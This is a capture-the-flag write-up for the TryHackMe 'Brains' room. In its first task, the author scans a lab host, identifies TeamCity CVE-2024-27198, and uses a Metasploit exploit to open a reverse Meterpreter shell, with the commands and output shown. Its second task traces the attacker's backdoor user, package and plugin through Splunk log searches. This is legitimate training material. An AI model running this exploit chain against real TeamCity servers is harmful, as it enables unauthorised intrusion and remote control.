## **Room:** [Brains](https://tryhackme.com/room/brains)
---
## **Task 1**
---
> **Prompt**
>
> > Welcome to the Brains challenge, part of TryHackMe’s Hackathon!
> > All brains gathered to build an engineering marvel; however, it seems strangers had found away to get in.
> > Start by deploying the machine; click on the Start Machine button in the upper-right-hand corner of this task to deploy the virtual machine for this room.
> > Note: Please allow the machine 4 - 6 minutes to fully boot.
Host: 10.201.68.214

```bash
nmap -sS -sV 10.201.68.214
```
Open ports: 
```text
22 -->ssh
80 -->http
50000 -->ibm-db2?
```
Other values of nmap:
```text
SF-Port50000-TCP:V=7.80%I=7%D=10/2%Time=68DEF59D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,140,"HTTP/1\.1\x20401\x20\r\nTeamCity-Node-Id:\x20MAIN_SERVER
SF:\r\nWWW-Authenticate:\x20Basic\x20realm=\"TeamCity\"\r\nWWW-Authenticat
SF:e:\x20Bearer\x20realm=\"TeamCity\"\r\nCache-Control:\x20no-store\r\nCon
SF:tent-Type:\x20text/plain;charset=UTF-8\r\nDate:\x20Thu,\x2002\x20Oct\x2
SF:02025\x2021:58:53\x20GMT\r\nConnection:\x20close\r\n\r\nAuthentication\
SF:x20required\nTo\x20login\x20manually\x20go\x20to\x20\"/login\.html\"\x2
SF:0page")%r(ibm-db2-das,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20tex
SF:t/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x204
SF:35\r\nDate:\x20Thu,\x2002\x20Oct\x202025\x2021:58:53\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
SF:>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\
SF:x20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20
SF:h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1
SF:\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14
SF:px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{hei
SF:ght:1px;background-color:#525D76;border:none;}</style></head><body><h1>
SF:HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></ht
SF:ml>")%r(ibm-db2,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html
SF:;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\n
SF:Date:\x20Thu,\x2002\x20Oct\x202025\x2021:58:53\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\
SF:x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20typ
SF:e=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x2
SF:0h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{f
SF:ont-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x
SF:20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1p
SF:x;background-color:#525D76;border:none;}</style></head><body><h1>HTTP\x
SF:20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%
SF:r(drda,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=
SF:utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20
SF:Thu,\x2002\x20Oct\x202025\x2021:58:53\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status
SF:\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/
SF:css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h
SF:3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size:
SF:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{f
SF:ont-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgro
SF:und-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\
SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
MAC Address: 16:FF:DB:6A:FF:17 (Unknown)
```

http://10.201.68.214/ --> shows me: Maintenance, We're currently performing some maintenance. Please check back soon.

http://10.201.68.214:22/ --> This address is restricted
http://10.201.68.214:50000/ --> redirects to http://10.201.68.214:50000/index.html and shows Log in to TeamCity

The web server is running JetBrains TeamCity version 2023.11.3, and I researched the software and found information about CVE-2024-27198 and CVE-2024-27199 from Rapid7:
```text
 https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/
 ```
In light of these discoveries, JetBrains released 2023.11.4 to mitigate these threats. So we are using 2023.11.3, which means the server is likely still vulnerable.
```text
> CVE-2024-27198 is an authentication bypass vulnerability in the web component of TeamCity that arises from an alternative path issue (CWE-288) and has a CVSS base score of 9.8 (Critical).
> CVE-2024-27199 is an authentication bypass vulnerability in the web component of TeamCity that arises from a path traversal issue (CWE-22) and has a CVSS base score of 7.3 (High)
```
Thus, I decided to use Metasploit.
```text
msf6 > search jetbrains

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  auxiliary/scanner/teamcity/teamcity_login                 .                normal     No     JetBrains TeamCity Login Scanner
   1  exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793  2023-09-19       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   2    \_ target: Windows                                      .                .          .      .
   3    \_ target: Linux                                        .                .          .      .
   4  exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198  2024-03-04       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   5    \_ target: Java                                         .                .          .      .
   6    \_ target: Java Server Page                             .                .          .      .
   7    \_ target: Windows Command                              .                .          .      .
   8    \_ target: Linux Command                                .                .          .      .
   9    \_ target: Unix Command                                 .                .          .      .


Interact with a module by name or index. For example info 9, use 9 or use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
After interacting with a module you can manually set a TARGET with set TARGET 'Unix Command'
```

Then I used the 4th exploit:

```nginx
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             10.201.68.214    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              50000            yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.201.21.209    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.
```
After running:
```nginx
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run
[*] Started reverse TCP handler on 10.201.21.209:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.WENyNGY3OTVUTldNa1ZoMnVRQnFvRW10OXVZ.OWM0ZDQ4MDAtYzcwYi00ZmEwLWJhNGMtMjdmOWY1NGMzY2Zl
[*] Uploading plugin: EozjFnOu
[*] Sending stage (58073 bytes) to 10.201.68.214
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_EozjFnOu
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/EozjFnOu
[*] Meterpreter session 1 opened (10.201.21.209:4444 -> 10.201.68.214:34876) at 2025-10-02 23:38:04 +0100
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/EozjFnOu' on the target

meterpreter > ls
Listing: /opt/teamcity/TeamCity/bin
```
While crawling through the directories, I found the flag file:
```nginx
Listing: /home/ubuntu
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  4096  dir   2025-10-02 22:48:40 +0100  .BuildServer
000667/rw-rw-rwx  0     fif   2025-10-02 22:47:31 +0100  .bash_history
100667/rw-rw-rwx  220   fil   2020-02-25 12:03:22 +0000  .bash_logout
100667/rw-rw-rwx  3771  fil   2020-02-25 12:03:22 +0000  .bashrc
040777/rwxrwxrwx  4096  dir   2024-07-02 10:39:13 +0100  .cache
040777/rwxrwxrwx  4096  dir   2024-08-02 09:54:40 +0100  .config
040777/rwxrwxrwx  4096  dir   2024-07-02 10:40:18 +0100  .local
100667/rw-rw-rwx  807   fil   2020-02-25 12:03:22 +0000  .profile
100667/rw-rw-rwx  66    fil   2024-07-02 10:59:35 +0100  .selected_editor
040777/rwxrwxrwx  4096  dir   2024-07-02 10:38:50 +0100  .ssh
100667/rw-rw-rwx  0     fil   2024-07-02 10:39:21 +0100  .sudo_as_admin_successful
100667/rw-rw-rwx  214   fil   2024-07-02 10:46:35 +0100  .wget-hsts
100666/rw-rw-rw-  4829  fil   2024-07-02 15:55:04 +0100  config.log
100666/rw-rw-rw-  38    fil   2024-07-02 11:05:47 +0100  flag.txt
```

In the end, the flag was: THM{faa9bac345709b6620a6200b484c7594}

---
## **Task 2**

Promt:
```text
> Now comes the detection part.

> The IT department has provided us one of the servers which was compromised as a result of the attack. Our task as a Forensics Analyst is to examine the host and identify the attacker's footprints in the post-exploitation stage.

> Lab Connection

> Before moving forward, deploy the machine. When you deploy the machine, it will be assigned an IP address: 10.201.65.255. The Splunk instance will  be accessible in about 5 minutes and can be accessed at 10.201.65.255:8000 using the credentials mentioned below:

> Username: splunk

> Password: analyst123
```
IP: 10.201.65.255

As I tracked the user and their movements, the only way I could see activity was through logs. So, I went to Search and, in the auth log, I searched for "new user" and found this:
```text
7/4/24
10:32:37.000 PM	
Jul  4 22:32:37 brains useradd[11207]: new user: name=eviluser, UID=1001, GID=1001, home=/home/eviluser, shell=/bin/bash, from=/dev/pts/0

    host = brains
    source = /var/log/auth.log
    sourcetype = auth_logs
```
The name of the user was: eviluser

Then I searched the logs with: 
```text
"source="/var/log/dpkg.log"  date_month="july" date_mday="4""
```
and found this:
```text
7/4/24
10:58:25.000 PM	
2024-07-04 22:58:25 status half-configured datacollector:amd64 1.0

    host = brains
    source = /var/log/dpkg.log
    sourcetype = packages
```
Package name was: datacollector
Then I needed to find the plugin, so I searched teamcity-activities.log for plugin with:
```text
source="/opt/teamcity/TeamCity/logs/teamcity-activities.log" plugin
```
Then found this:
```text
7/4/24
10:08:31.921 PM	
[2024-07-04 22:08:31,921]   INFO - s.buildServer.ACTIVITIES.AUDIT - plugin_uploaded: Plugin "AyzzbuXY" was updated by "user with id=11" with comment "Plugin was uploaded to /home/ubuntu/.BuildServer/plugins/AyzzbuXY.zip"
```
The plug in was: AyzzbuXY.zip



















